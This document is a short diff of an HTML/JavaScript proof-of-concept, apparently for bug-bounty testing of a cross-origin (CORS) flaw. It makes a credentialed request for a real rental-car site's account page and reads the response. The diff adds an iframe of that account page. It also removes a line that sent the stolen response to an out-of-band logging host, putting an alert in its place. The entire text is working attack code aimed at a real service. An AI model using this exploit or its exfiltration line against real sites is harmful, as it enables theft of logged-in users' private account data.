@@ -1,3 +1,4 @@
+<iframe id="victim_website" src="https://www.sixt.com/account/" sandbox="allow-forms"></iframe>
 <script>
 var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
@@ -6,6 +7,6 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//caotdmji7gcu01rco42gqm3zz6qj9xgo4.oast.me/log?key='+this.responseText; 
+    alert(this.responseText); 
 };
 </script>
